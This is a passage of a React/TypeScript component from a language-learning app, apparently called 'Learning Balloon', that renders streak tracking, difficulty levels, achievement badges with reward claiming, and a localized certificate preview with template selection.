                            const isTodaySlot = daySlot === cycleFilled;

                            return (
                              <div
                                key={daySlot}
                                className={`py-2 px-1 rounded-xl border flex flex-col items-center justify-center gap-0.5 transition-all ${
                                  isLit
                                    ? isTodaySlot
                                      ? 'bg-gradient-to-b from-amber-400/35 to-orange-500/35 border-amber-400 text-amber-600 dark:text-amber-300 ring-2 ring-amber-400/60 shadow-sm'
                                      : 'bg-gradient-to-b from-amber-400/25 to-orange-500/25 border-amber-400 text-amber-600 dark:text-amber-300 shadow-sm'
                                    : isDark
                                    ? 'bg-slate-900/60 border-slate-700/80 text-slate-500'
                                    : 'bg-white/70 border-amber-200/70 text-slate-400'
                                }`}
                              >
                                <Flame
                                  className={`w-4 h-4 ${
                                    isLit
                                      ? 'fill-amber-500 text-orange-500'
                                      : 'opacity-40'
                                  }`}
                                />
                                <span className="text-[10px] font-display font-extrabold truncate max-w-full">
                                  {weekdayLabel}
                                </span>
                                <span
                                  dir="ltr"
                                  className="text-[9px] font-mono font-bold opacity-75"
                                >
                                  D{daySlot}
                                </span>
                              </div>
                            );
                          });
                        })()}
                      </div>

                      {/* Automatic Milestone Progression Tier Pills */}
                      <div className="flex flex-wrap items-center justify-between gap-1.5">
                        {[7, 14, 30, 60, 100, 365].map((milestone) => {
                          const isReached = streakDays >= milestone;
                          const isCurrentTarget = streakGoalDays === milestone;
                          return (
                            <span
                              key={milestone}
                              className={`px-2.5 py-1 rounded-lg text-[11px] font-extrabold border transition-all ${
                                isReached
                                  ? 'bg-emerald-500/20 border-emerald-500/50 text-emerald-600 dark:text-emerald-300'
                                  : isCurrentTarget
                                  ? 'bg-amber-500 text-slate-950 border-amber-400 shadow-sm'
                                  : isDark
                                  ? 'bg-slate-900/70 border-slate-700 text-slate-400'
                                  : 'bg-amber-100/70 border-amber-200 text-amber-900/70'
                              }`}
                            >
                              {isReached ? '✓ ' : '🎯 '}
                              {mt.presetTargetDays(milestone)}
                            </span>
                          );
                        })}
                      </div>

                      {onTriggerGoalCelebration && (
                        <button
                          type="button"
                          onClick={() => {
                            onClose();
                            onTriggerGoalCelebration();
                          }}
                          className="mt-3 w-full py-2.5 px-4 rounded-2xl bg-gradient-to-r from-amber-400 via-orange-500 to-rose-500 hover:brightness-105 text-slate-950 font-display font-extrabold text-xs sm:text-sm shadow-[0_3px_0_#C2410C] flex items-center justify-center gap-2 cursor-pointer"
                        >
                          <Sparkles className="w-4 h-4" />
                          <span>{obCopy.goalAchievedPreviewBtn}</span>
                        </button>
                      )}
                    </div>
                  </div>

                  {/* Difficulty Progression Box (Easy -> Medium -> Hard) */}
                  <div
                    className={`rounded-3xl p-4 sm:p-5 border-2 flex flex-col justify-between ${
                      isDark
                        ? 'bg-slate-800/80 border-slate-700'
                        : 'bg-gradient-to-b from-sky-50/90 to-indigo-50/50 border-sky-200'
                    }`}
                  >
                    <div>
                      <div className="flex items-center justify-between gap-2 mb-3">
                        <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-xl bg-sky-500/20 text-sky-600 dark:text-sky-300 text-xs font-extrabold">
                          <Trophy className="w-4 h-4" />
                          {mt.levelSystemBadge}
                        </span>
                      </div>

                      <div className="mb-3">
                        <label className="block text-xs font-extrabold mb-1">
                          {mt.usernameInputLabel}
                        </label>
                        <div className="flex flex-col sm:flex-row items-stretch sm:items-center gap-2">
                          <div className="relative flex-1 flex items-center">
                            <input
                              type="text"
                              value={learnerName}
                              onChange={(e) => onChangeLearnerName(e.target.value)}
                              placeholder={mt.usernameInputPlaceholder}
                              className={`w-full pl-3.5 pr-9 py-2 rounded-xl border text-sm font-bold ${
                                isDark
                                  ? 'bg-slate-900 border-slate-700 text-white'
                                  : 'bg-white border-sky-200 text-slate-900'
                              }`}
                            />
                            {learnerName.length > 0 && (
                              <button
                                type="button"
                                onClick={() => onChangeLearnerName('')}
                                title="Clear name"
                                className="absolute right-2.5 top-1/2 -translate-y-1/2 w-5 h-5 rounded-full bg-slate-200 dark:bg-slate-700 hover:bg-rose-500 hover:text-white text-slate-600 dark:text-slate-300 text-[10px] font-black flex items-center justify-center cursor-pointer transition-colors"
                              >
                                ✕
                              </button>
                            )}
                          </div>
                          <button
                            type="button"
                            onClick={() => {
                              if (typeof window === 'undefined') return;
                              const SpeechRec =
                                (window as any).SpeechRecognition ||
                                (window as any).webkitSpeechRecognition;
                              if (!SpeechRec) return;
                              try {
                                const rec = new SpeechRec();
                                rec.lang = nativeLang.bcp47;
                                rec.continuous = false;
                                rec.interimResults = false;
                                rec.onresult = (ev: any) => {
                                  const transcript = (
                                    ev.results?.[0]?.[0]?.transcript || ''
                                  ).trim();
                                  if (transcript) {
                                    onChangeLearnerName(transcript);
                                  }
                                };
                                rec.start();
                              } catch {}
                            }}
                            className="px-3.5 py-2 rounded-xl bg-[#0066FF] hover:bg-blue-600 text-white font-display font-extrabold text-xs flex items-center justify-center gap-1.5 cursor-pointer shrink-0"
                          >
                            <Mic className="w-3.5 h-3.5" />
                            <span>
                              {getTopicPathUICopy(nativeLang).speakUsernameBtn}
                            </span>
                          </button>
                        </div>
                        <div className="mt-1.5 text-xs font-extrabold text-emerald-600 dark:text-emerald-400 flex items-center gap-1.5">
                          <span>
                            ✓ {getTopicPathUICopy(nativeLang).usernameBadgeLabel}
                          </span>
                          <span>
                            {localizeUsernameForSpokenLanguage(
                              learnerName.trim() ||
                                currentUser?.displayName ||
                                mt.currentUserDefaultName,
                              nativeLang,
                              mt.currentUserDefaultName
                            )}
                          </span>
                        </div>
                      </div>

                      <div className="space-y-2.5">
                        {/* Level 1: Easy */}
                        <button
                          type="button"
                          onClick={() => {
                            onChangeDifficultyLevel('easy');
                            showTempToast(mt.level1SelectedToast);
                          }}
                          className={`w-full p-3 rounded-2xl border-2 text-start transition-all flex items-center justify-between gap-3 cursor-pointer ${
                            difficultyLevel === 'easy'
                              ? 'bg-emerald-500/20 border-emerald-500 shadow-[0_3px_0_#10B981]'
                              : isDark
                              ? 'bg-slate-900/70 border-slate-700 hover:border-emerald-400'
                              : 'bg-white border-slate-200 hover:border-emerald-400'
                          }`}
                        >
                          <div>
                            <div className="font-display font-extrabold text-sm sm:text-base flex items-center gap-1.5">
                              <span>{mt.level1Title}</span>
                              {difficultyLevel === 'easy' && (
                                <span className="text-[11px] px-2 py-0.5 rounded-full bg-emerald-500 text-white">
                                  {mt.activeBadge}
                                </span>
                              )}
                            </div>
                            <p className="text-xs opacity-80 mt-0.5">
                              {mt.level1Desc}
                            </p>
                          </div>
                          <CheckCircle2 className="w-5 h-5 text-emerald-500 shrink-0" />
                        </button>

                        {/* Level 2: Medium */}
                        <button
                          type="button"
                          onClick={() => {
                            onChangeDifficultyLevel('medium');
                            showTempToast(mt.level2SelectedToast);
                          }}
                          className={`w-full p-3 rounded-2xl border-2 text-start transition-all flex items-center justify-between gap-3 cursor-pointer ${
                            difficultyLevel === 'medium'
                              ? 'bg-amber-500/20 border-amber-500 shadow-[0_3px_0_#F59E0B]'
                              : isDark
                              ? 'bg-slate-900/70 border-slate-700 hover:border-amber-400'
                              : 'bg-white border-slate-200 hover:border-amber-400'
                          }`}
                        >
                          <div>
                            <div className="font-display font-extrabold text-sm sm:text-base flex items-center gap-1.5">
                              <span>{mt.level2Title}</span>
                              {difficultyLevel === 'medium' && (
                                <span className="text-[11px] px-2 py-0.5 rounded-full bg-amber-500 text-slate-950">
                                  {mt.activeBadge}
                                </span>
                              )}
                            </div>
                            <p className="text-xs opacity-80 mt-0.5">
                              {mt.level2Desc}
                            </p>
                          </div>
                          {easyCompleted ? (
                            <Sparkles className="w-5 h-5 text-amber-500 shrink-0" />
                          ) : (
                            <Lock className="w-4 h-4 text-slate-400 shrink-0" />
                          )}
                        </button>

                        {/* Level 3: Hard */}
                        <button
                          type="button"
                          onClick={() => {
                            onChangeDifficultyLevel('hard');
                            showTempToast(mt.level3SelectedToast);
                          }}
                          className={`w-full p-3 rounded-2xl border-2 text-start transition-all flex items-center justify-between gap-3 cursor-pointer ${
                            difficultyLevel === 'hard'
                              ? 'bg-rose-500/20 border-rose-500 shadow-[0_3px_0_#F43F5E]'
                              : isDark
                              ? 'bg-slate-900/70 border-slate-700 hover:border-rose-400'
                              : 'bg-white border-slate-200 hover:border-rose-400'
                          }`}
                        >
                          <div>
                            <div className="font-display font-extrabold text-sm sm:text-base flex items-center gap-1.5">
                              <span>{mt.level3Title}</span>
                              {difficultyLevel === 'hard' && (
                                <span className="text-[11px] px-2 py-0.5 rounded-full bg-rose-500 text-white">
                                  {mt.activeBadge}
                                </span>
                              )}
                            </div>
                            <p className="text-xs opacity-80 mt-0.5">
                              {mt.level3Desc}
                            </p>
                          </div>
                          {mediumCompleted ? (
                            <Trophy className="w-5 h-5 text-rose-500 shrink-0" />
                          ) : (
                            <Lock className="w-4 h-4 text-slate-400 shrink-0" />
                          )}
                        </button>
                      </div>
                    </div>
                  </div>

                  {/* Quick-Preview Achievements Strip inside Streak & Levels Tab */}
                  <div
                    className={`md:col-span-2 rounded-2xl p-4 border flex flex-col sm:flex-row sm:items-center justify-between gap-3 ${
                      isDark
                        ? 'bg-slate-900/90 border-slate-800'
                        : 'bg-[#F3F8FF] border-sky-100'
                    }`}
                  >
                    <div className="space-y-1">
                      <div className="font-display font-extrabold text-sm sm:text-base flex items-center gap-2 text-[#0066FF] dark:text-sky-400">
                        <Award className="w-4 h-4 shrink-0" />
                        <span>
                          {mt.achievementsStripTitle(
                            unlockedAchievementsCount,
                            achievementsList.length
                          )}
                        </span>
                      </div>
                      <p className="text-xs text-slate-600 dark:text-slate-300">
                        {mt.achievementsStripDesc}
                      </p>
                    </div>
                    <button
                      type="button"
                      onClick={() => setActiveTab('achievements')}
                      className="px-4 py-2 rounded-xl bg-[#0066FF] hover:bg-[#0052CC] text-white font-display font-extrabold text-xs sm:text-sm cursor-pointer whitespace-nowrap shrink-0"
                    >
                      {mt.viewAchievementsBtn}
                    </button>
                  </div>
                </div>
              )}

              {/* TAB: ACHIEVEMENTS & MILESTONE BADGES */}
              {activeTab === 'achievements' && (
                <div className="space-y-4">
                  {/* Achievements Summary Banner + Interactive Filter Controls */}
                  <div
                    className={`rounded-2xl p-4 sm:p-5 border flex flex-col lg:flex-row lg:items-center justify-between gap-4 ${
                      isDark
                        ? 'bg-slate-900/90 border-slate-800 text-white'
                        : 'bg-gradient-to-r from-[#DCEBFF] via-[#EBF4FF] to-[#F5F9FF] border-sky-100 text-slate-900'
                    }`}
                  >
                    <div className="space-y-1.5">
                      <h3 className="font-display font-extrabold text-lg sm:text-xl flex items-center gap-2">
                        <Trophy className="w-5 h-5 text-amber-500 shrink-0" />
                        <span>{mt.achievementsBannerTitle}</span>
                      </h3>
                      <p className="text-xs sm:text-sm text-slate-600 dark:text-slate-300">
                        {mt.achievementsBannerDesc}
                      </p>
                      <div className="flex flex-wrap items-center gap-x-3 gap-y-1 pt-1 text-xs font-semibold text-slate-600 dark:text-slate-400 tabular-nums">
                        <span>
                          {mt.unlockedBadgesStat}{' '}
                          <strong className="text-slate-900 dark:text-white">
                            {unlockedAchievementsCount} / {achievementsList.length}
                          </strong>
                        </span>
                        <span aria-hidden="true">·</span>
                        <span>
                          {mt.currentStreakStat}{' '}
                          <strong className="text-slate-900 dark:text-white">
                            {streakDays}d
                          </strong>
                        </span>
                        <span aria-hidden="true">·</span>
                        <span>
                          {mt.balloonsPoppedStat}{' '}
                          <strong className="text-slate-900 dark:text-white">
                            {totalBalloonsPoppedUser}
                          </strong>
                        </span>
                        <span aria-hidden="true">·</span>
                        <span>
                          {mt.wordsMasteredStat}{' '}
                          <strong className="text-slate-900 dark:text-white">
                            {effectiveWordsMasteredUser}
                          </strong>
                        </span>
                      </div>
                    </div>

                    {/* Right Controls: Claim All Unlocked + Segmented Filter Control */}
                    <div className="flex flex-wrap items-center gap-2.5 self-start lg:self-center shrink-0">
                      {unclaimedUnlockedAchievements.length > 0 && (
                        <button
                          type="button"
                          onClick={handleClaimAllUnlockedRewards}
                          className="px-3.5 py-2 rounded-xl bg-gradient-to-r from-amber-400 to-orange-500 hover:brightness-105 text-slate-950 font-display font-extrabold text-xs shadow-xs flex items-center gap-1.5 cursor-pointer whitespace-nowrap"
                        >
                          <Star className="w-3.5 h-3.5 fill-slate-950 text-slate-950" />
                          <span>
                            Claim All ({unclaimedUnlockedAchievements.length})
                          </span>
                        </button>
                      )}

                      <div
                        className={`inline-flex items-center gap-1 p-1 rounded-xl border ${
                          isDark
                            ? 'bg-slate-950 border-slate-800'
                            : 'bg-white border-sky-100'
                        }`}
                      >
                        <button
                          type="button"
                          onClick={() => setAchievementFilter('all')}
                          className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-colors cursor-pointer whitespace-nowrap ${
                            achievementFilter === 'all'
                              ? 'bg-[#0066FF] text-white'
                              : isDark
                              ? 'text-slate-400 hover:text-white'
                              : 'text-slate-600 hover:text-slate-900'
                          }`}
                        >
                          {mt.filterAll(achievementsList.length)}
                        </button>
                        <button
                          type="button"
                          onClick={() => setAchievementFilter('unlocked')}
                          className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-colors cursor-pointer whitespace-nowrap ${
                            achievementFilter === 'unlocked'
                              ? 'bg-[#0066FF] text-white'
                              : isDark
                              ? 'text-slate-400 hover:text-white'
                              : 'text-slate-600 hover:text-slate-900'
                          }`}
                        >
                          {mt.filterUnlocked(unlockedAchievementsCount)}
                        </button>
                        <button
                          type="button"
                          onClick={() => setAchievementFilter('locked')}
                          className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-colors cursor-pointer whitespace-nowrap ${
                            achievementFilter === 'locked'
                              ? 'bg-[#0066FF] text-white'
                              : isDark
                              ? 'text-slate-400 hover:text-white'
                              : 'text-slate-600 hover:text-slate-900'
                          }`}
                        >
                          {mt.filterInProgress(
                            achievementsList.length - unlockedAchievementsCount
                          )}
                        </button>
                      </div>
                    </div>
                  </div>

                  {/* Signature Milestone Medallions Strip (10 Words Mastered · 5 Day Streak · First Certificate Earned) */}
                  <div
                    className={`rounded-2xl p-4 border grid grid-cols-1 md:grid-cols-3 gap-3.5 ${
                      isDark
                        ? 'bg-slate-900/60 border-slate-800'
                        : 'bg-slate-50/90 border-slate-200/80'
                    }`}
                  >
                    {achievementsList.slice(0, 3).map((coreBadge) => {
                      const corePct = Math.min(
                        100,
                        Math.round(
                          (coreBadge.current / Math.max(1, coreBadge.target)) *
                            100
                        )
                      );
                      return (
                        <div
                          key={`core_${coreBadge.id}`}
                          className={`p-3.5 rounded-xl border flex items-center gap-3.5 ${
                            coreBadge.unlocked
                              ? isDark
                                ? 'bg-slate-900 border-amber-500/40'
                                : 'bg-white border-sky-200 shadow-2xs'
                              : isDark
                              ? 'bg-slate-900/40 border-slate-800'
                              : 'bg-white/70 border-slate-200/70'
                          }`}
                        >
                          {/* Crafted Visual Medallion Emblem */}
                          <div
                            className={`relative w-14 h-14 rounded-2xl p-0.5 shrink-0 flex items-center justify-center ${
                              coreBadge.unlocked
                                ? `bg-gradient-to-br ${coreBadge.emblemGradient} shadow-md`
                                : isDark
                                ? 'bg-slate-800 border border-slate-700'
                                : 'bg-slate-200 border border-slate-300'
                            }`}
                          >
                            <div
                              className={`w-full h-full rounded-[14px] flex flex-col items-center justify-center ${
                                coreBadge.unlocked
                                  ? 'bg-slate-950/20 text-white'
                                  : 'text-slate-400 dark:text-slate-500'
                              }`}
                            >
                              {coreBadge.emblemKind === 'words' ? (
                                <BookOpen className="w-6 h-6 stroke-[2.2]" />
                              ) : coreBadge.emblemKind === 'streak' ? (
                                <Flame className="w-6 h-6 stroke-[2.2]" />
                              ) : (
                                <GraduationCap className="w-6 h-6 stroke-[2.2]" />
                              )}
                            </div>
                            {coreBadge.unlocked && (
                              <span className="absolute -bottom-1 -right-1 w-5 h-5 rounded-full bg-emerald-500 text-white flex items-center justify-center border-2 border-white dark:border-slate-900">
                                <CheckCircle2 className="w-3 h-3" />
                              </span>
                            )}
                          </div>

                          <div className="min-w-0 flex-1 space-y-1">
                            <div className="text-[11px] font-semibold text-slate-500 dark:text-slate-400">
                              {coreBadge.tierLabel} · +{coreBadge.rewardStars} ⭐
                            </div>
                            <div className="font-display font-extrabold text-xs sm:text-sm truncate">
                              {coreBadge.localizedTitle}
                            </div>
                            <div className="text-[11px] text-slate-500 dark:text-slate-400 truncate">
                              {coreBadge.badgeTitle} ({corePct}%)
                            </div>
                          </div>
                        </div>
                      );
                    })}
                  </div>

                  {/* Full Milestone Badges Grid */}
                  <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3.5">
                    {filteredAchievements.map((badge) => {
                      const pct = Math.min(
                        100,
                        Math.round(
                          (badge.current / Math.max(1, badge.target)) * 100
                        )
                      );
                      const isClaimed = claimedAchievementIds.includes(badge.id);

                      return (
                        <div
                          key={badge.id}
                          className={`rounded-2xl p-4 border flex flex-col justify-between gap-3 transition-all ${
                            badge.unlocked
                              ? isDark
                                ? 'bg-slate-900/95 border-amber-500/50 shadow-[0_8px_24px_rgba(245,158,11,0.12)]'
                                : 'bg-white border-sky-200 shadow-[0_8px_24px_rgba(0,102,255,0.08)]'
                              : isDark
                              ? 'bg-slate-900/45 border-slate-800/80 opacity-85'
                              : 'bg-slate-50/80 border-slate-200/80 opacity-90'
                          }`}
                        >
                          <div className="space-y-2.5">
                            <div className="flex items-start justify-between gap-2.5">
                              <div className="flex items-center gap-3 min-w-0">
                                {/* Multi-Ring Visual Badge Medallion */}
                                <div
                                  className={`relative w-14 h-14 rounded-2xl p-0.5 flex items-center justify-center shrink-0 ${
                                    badge.unlocked
                                      ? `bg-gradient-to-br ${badge.emblemGradient} shadow-sm`
                                      : isDark
                                      ? 'bg-slate-800 border border-slate-700'
                                      : 'bg-slate-200/80 border border-slate-300'
                                  }`}
                                >
                                  <div
                                    className={`w-full h-full rounded-[14px] flex flex-col items-center justify-center ${
                                      badge.unlocked
                                        ? 'bg-slate-950/15 text-white'
                                        : 'text-slate-400 dark:text-slate-500'
                                    }`}
                                  >
                                    {badge.emblemKind === 'words' ? (
                                      <BookOpen className="w-6 h-6 stroke-[2.2]" />
                                    ) : badge.emblemKind === 'streak' ? (
                                      <Flame className="w-6 h-6 stroke-[2.2]" />
                                    ) : badge.emblemKind === 'certificate' ? (
                                      <GraduationCap className="w-6 h-6 stroke-[2.2]" />
                                    ) : badge.emblemKind === 'travel' ? (
                                      <Globe className="w-6 h-6 stroke-[2.2]" />
                                    ) : badge.emblemKind === 'conversation' ? (
                                      <MessageCircle className="w-6 h-6 stroke-[2.2]" />
                                    ) : badge.emblemKind === 'stars' ? (
                                      <Star className="w-6 h-6 stroke-[2.2]" />
                                    ) : (
                                      <Award className="w-6 h-6 stroke-[2.2]" />
                                    )}
                                  </div>
                                </div>

                                <div className="min-w-0">
                                  <div className="text-[11px] font-semibold text-slate-500 dark:text-slate-400">
                                    {badge.tierLabel}
                                  </div>
                                  <h4 className="font-display font-extrabold text-sm sm:text-base truncate">
                                    {badge.localizedTitle}
                                  </h4>
                                  <div className="text-[11px] font-semibold text-slate-500 dark:text-slate-400 flex items-center gap-1.5 tabular-nums">
                                    <span className="truncate">
                                      {badge.badgeTitle}
                                    </span>
                                    <span aria-hidden="true">·</span>
                                    <span className="shrink-0">
                                      +{badge.rewardStars} ⭐
                                    </span>
                                  </div>
                                </div>
                              </div>

                              {badge.unlocked ? (
                                <CheckCircle2 className="w-5 h-5 text-emerald-500 shrink-0" />
                              ) : (
                                <Lock className="w-4 h-4 text-slate-400 shrink-0" />
                              )}
                            </div>

                            <p className="text-xs text-slate-600 dark:text-slate-300 leading-relaxed">
                              {badge.description}
                            </p>
                          </div>

                          {/* Progress Bar + Action Footer */}
                          <div className="space-y-2 pt-2 border-t border-slate-100 dark:border-slate-800/80">
                            <div className="flex items-center justify-between text-xs font-bold tabular-nums">
                              <span
                                className={
                                  badge.unlocked
                                    ? 'text-emerald-600 dark:text-emerald-400'
                                    : 'text-slate-500 dark:text-slate-400'
                                }
                              >
                                {badge.unlocked
                                  ? mt.statusUnlocked
                                  : mt.statusInProgress}
                              </span>
                              <span>
                                {badge.current} / {badge.target} {badge.unit} ({pct}%)
                              </span>
                            </div>

                            <div className="w-full h-2 rounded-full bg-slate-200 dark:bg-slate-800 overflow-hidden">
                              <div
                                className={`h-full rounded-full transition-all duration-300 ${
                                  badge.unlocked
                                    ? 'bg-emerald-500'
                                    : 'bg-[#0066FF]'
                                }`}
                                style={{ width: `${pct}%` }}
                              />
                            </div>

                            {badge.unlocked && (
                              <button
                                type="button"
                                onClick={() =>
                                  handleClaimAchievementReward(
                                    badge.id,
                                    badge.rewardStars,
                                    badge.localizedTitle
                                  )
                                }
                                className={`w-full py-2 px-3 rounded-xl font-display font-extrabold text-xs transition-colors cursor-pointer flex items-center justify-center gap-1.5 ${
                                  isClaimed
                                    ? isDark
                                      ? 'bg-emerald-950/60 text-emerald-300 border border-emerald-700/50'
                                      : 'bg-emerald-50 text-emerald-700 border border-emerald-200'
                                    : 'bg-[#0066FF] hover:bg-[#0052CC] text-white'
                                }`}
                              >
                                <Star className="w-3.5 h-3.5 fill-amber-300 text-amber-400 shrink-0" />
                                <span>
                                  {isClaimed
                                    ? mt.rewardClaimedBtn(badge.rewardStars)
                                    : mt.claimRewardBtn(badge.rewardStars)}
                                </span>
                              </button>
                            )}
                          </div>
                        </div>
                      );
                    })}
                  </div>
                </div>
              )}

              {/* TAB 2: LOCALIZED CERTIFICATE PREVIEW, QR CODE GENERATOR & PDF DOWNLOAD */}
              {activeTab === 'certificate' && courseCompleted && (
                <div className="space-y-4">
                  {/* Course Progress & Completion Status Banner */}
                  <div
                    className={`rounded-2xl p-3.5 sm:p-4 border-2 flex flex-wrap items-center justify-between gap-3 ${
                      isDark
                        ? 'bg-emerald-950/50 border-emerald-500/70 text-emerald-100'
                        : 'bg-emerald-50 border-emerald-300 text-emerald-950'
                    }`}
                  >
                    <div className="flex items-center gap-3">
                      <div className="w-11 h-11 rounded-2xl bg-emerald-500 text-white flex items-center justify-center font-extrabold text-lg shrink-0">
                        🎉
                      </div>
                      <div>
                        <h4 className="font-display font-extrabold text-sm sm:text-base">
                          {uiCopy.certPromiseTitle(
                            `${targetLang.flag} ${targetLang.nativeName}`
                          )}
                        </h4>
                        <p className="text-xs opacity-85 mt-0.5">
                          🍎 {wordsCompleted}/{wordsTotal} · 💬 {conversationsCompleted}/{conversationsTotal}
                        </p>
                      </div>
                    </div>

                    <div className="flex items-center gap-2 text-xs font-extrabold">
                      <span className="px-3 py-1.5 rounded-xl bg-white/80 dark:bg-slate-900/80 text-slate-900 dark:text-white border border-amber-400/50">
                        {previewSerial}
                      </span>
                    </div>
                  </div>

                  {/* Certificate Language Selector (Course Language vs Spoken Language vs Bilingual) */}
                  <div
                    className={`rounded-2xl p-3.5 border-2 ${
                      isDark
                        ? 'bg-slate-800/90 border-slate-700'
                        : 'bg-sky-50/80 border-sky-200'
                    }`}
                  >
                    <label className="block text-xs sm:text-sm font-extrabold mb-2 flex items-center gap-1.5">
                      <Globe className="w-4 h-4 text-sky-500" />
                      <span>{uiCopy.certLangSelectorLabel}</span>
                    </label>
                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-2">
                      <button
                        type="button"
                        onClick={() => onChangeCertLanguageMode('spoken')}
                        className={`py-2.5 px-3 rounded-xl text-xs sm:text-sm font-extrabold border-2 transition-all cursor-pointer ${
                          certLanguageMode === 'spoken'
                            ? 'bg-gradient-to-b from-[#38BDF8] to-[#0284C7] text-white border-sky-400 shadow-sm'
                            : isDark
                            ? 'bg-slate-900 border-slate-700 text-slate-300'
                            : 'bg-white border-slate-300 text-slate-800'
                        }`}
                      >
                        {nativeLang.flag}{' '}
                        {uiCopy.certLangOptionSpoken(nativeLang.nativeName)}
                      </button>

                      <button
                        type="button"
                        onClick={() => onChangeCertLanguageMode('course')}
                        className={`py-2.5 px-3 rounded-xl text-xs sm:text-sm font-extrabold border-2 transition-all cursor-pointer ${
                          certLanguageMode === 'course'
                            ? 'bg-gradient-to-b from-[#38BDF8] to-[#0284C7] text-white border-sky-400 shadow-sm'
                            : isDark
                            ? 'bg-slate-900 border-slate-700 text-slate-300'
                            : 'bg-white border-slate-300 text-slate-800'
                        }`}
                      >
                        {targetLang.flag}{' '}
                        {uiCopy.certLangOptionCourse(targetLang.nativeName)}
                      </button>

                      <button
                        type="button"
                        onClick={() => onChangeCertLanguageMode('bilingual')}
                        className={`py-2.5 px-3 rounded-xl text-xs sm:text-sm font-extrabold border-2 transition-all cursor-pointer ${
                          certLanguageMode === 'bilingual'
                            ? 'bg-gradient-to-b from-[#38BDF8] to-[#0284C7] text-white border-sky-400 shadow-sm'
                            : isDark
                            ? 'bg-slate-900 border-slate-700 text-slate-300'
                            : 'bg-white border-slate-300 text-slate-800'
                        }`}
                      >
                        {nativeLang.flag} + {targetLang.flag}{' '}
                        {uiCopy.certLangOptionBilingual(
                          targetLang.nativeName,
                          nativeLang.nativeName
                        )}
                      </button>
                    </div>
                  </div>

                  {/* Controls for Student Name, Completion Date & Official Template Selection */}
                  <div
                    className={`rounded-3xl p-4 border-2 grid grid-cols-1 sm:grid-cols-3 gap-3 ${
                      isDark
                        ? 'bg-slate-800/80 border-slate-700'
                        : 'bg-slate-50 border-slate-200'
                    }`}
                  >
                    {/* Student Name Input */}
                    <div>
                      <label className="block text-xs font-extrabold mb-1">
                        {mt.studentNameCertLabel}
                      </label>
                      <div className="relative flex items-center">
                        <input
                          type="text"
                          value={learnerName}
                          onChange={(e) => onChangeLearnerName(e.target.value)}
                          placeholder={uiCopy.usernamePlaceholder}
                          className={`w-full pl-3 pr-9 py-2 rounded-xl border text-sm font-extrabold ${
                            isDark
                              ? 'bg-slate-900 border-slate-700 text-white'
                              : 'bg-white border-slate-300 text-slate-900'
                          }`}
                        />
                        {learnerName.length > 0 && (
                          <button
                            type="button"
                            onClick={() => onChangeLearnerName('')}
                            title="Clear name"
                            className="absolute right-2.5 top-1/2 -translate-y-1/2 w-5 h-5 rounded-full bg-slate-200 dark:bg-slate-700 hover:bg-rose-500 hover:text-white text-slate-600 dark:text-slate-300 text-[10px] font-black flex items-center justify-center cursor-pointer transition-colors"
                          >
                            ✕
                          </button>
                        )}
                      </div>
                    </div>

                    {/* Completion Date Input */}
                    <div>
                      <label className="block text-xs font-extrabold mb-1 flex items-center gap-1">
                        <Calendar className="w-3.5 h-3.5 text-amber-500" />
                        <span>{mt.completionDateCertLabel}</span>
                      </label>
                      <input
                        type="date"
                        value={completionDate}
                        onChange={(e) => onChangeCompletionDate(e.target.value)}
                        className={`w-full px-3 py-2 rounded-xl border text-sm font-extrabold ${
                          isDark
                            ? 'bg-slate-900 border-slate-700 text-white'
                            : 'bg-white border-slate-300 text-slate-900'
                        }`}
                      />
                      <span className="block text-[11px] opacity-75 mt-0.5">
                        <strong>{readableCompletionDate}</strong>
                      </span>
                    </div>

                    {/* Template Selector */}
                    <div>
                      <label className="block text-xs font-extrabold mb-1">
                        {mt.selectCertDesignLabel}
                      </label>
                      <div className="flex gap-1.5">
                        <button
                          type="button"
                          onClick={() => {
                            setSelectedTemplate('template_1');
                            try {
                              localStorage.setItem(
                                CERT_TEMPLATE_CHOICE_KEY,
                                'template_1'
                              );
                            } catch {}
                          }}
                          className={`flex-1 py-2 px-2 rounded-xl text-xs font-extrabold border transition-all cursor-pointer ${
                            selectedTemplate === 'template_1'
                              ? 'bg-amber-400 text-slate-950 border-amber-500 shadow-sm'
                              : isDark
                              ? 'bg-slate-900 border-slate-700 text-slate-300'
                              : 'bg-white border-slate-300 text-slate-700'
                          }`}
                        >
                          {mt.design1Arch}
                        </button>
                        <button
                          type="button"
                          onClick={() => {
                            setSelectedTemplate('template_2');
                            try {
                              localStorage.setItem(
                                CERT_TEMPLATE_CHOICE_KEY,
                                'template_2'
                              );
                            } catch {}
                          }}
                          className={`flex-1 py-2 px-2 rounded-xl text-xs font-extrabold border transition-all cursor-pointer ${
                            selectedTemplate === 'template_2'
                              ? 'bg-amber-400 text-slate-950 border-amber-500 shadow-sm'
                              : isDark
                              ? 'bg-slate-900 border-slate-700 text-slate-300'
                              : 'bg-white border-slate-300 text-slate-700'
                          }`}
                        >
                          {mt.design2Cap}
                        </button>
                        <button
                          type="button"
                          onClick={() => fileInputRef.current?.click()}
                          className={`py-2 px-2.5 rounded-xl text-xs font-extrabold border transition-all cursor-pointer flex items-center gap-1 ${
                            selectedTemplate === 'custom'
                              ? 'bg-amber-400 text-slate-950 border-amber-500 shadow-sm'
                              : isDark
                              ? 'bg-slate-900 border-slate-700 text-slate-300'
                              : 'bg-white border-slate-300 text-slate-700'
                          }`}
                          title={mt.uploadCustomDesignTitle}
                        >
                          <Upload className="w-3.5 h-3.5" />
                        </button>
                        <input
                          ref={fileInputRef}
                          type="file"
                          accept="image/*"
                          onChange={handleUploadCustomCertTemplate}
                          className="hidden"
                        />
                      </div>
                    </div>
                  </div>

                  {/* Live High-Resolution Rendered Certificate Preview (With QR Code & Chosen Language) */}
                  <div className="relative rounded-3xl overflow-hidden border-4 border-amber-400 shadow-[0_18px_50px_rgba(217,119,6,0.28)] bg-slate-950">
                    {livePreviewDataUrl ? (
                      <img
                        src={livePreviewDataUrl}
                        alt="Learning Balloon Official Certificate Preview"
                        className="w-full h-auto object-contain block"
                      />
                    ) : (
                      <div className="aspect-[3/2] w-full flex items-center justify-center text-amber-300 font-display font-extrabold text-sm">
                        {mt.preparingCertAndQr}
                      </div>
                    )}
                  </div>

                  {/* Interactive QR Code Generator Panel + PDF Download Action Bar */}
                  <div
                    className={`p-4 rounded-3xl border-2 space-y-3 ${
                      isDark
                        ? 'bg-slate-800/90 border-slate-700'
                        : 'bg-amber-50/90 border-amber-200'
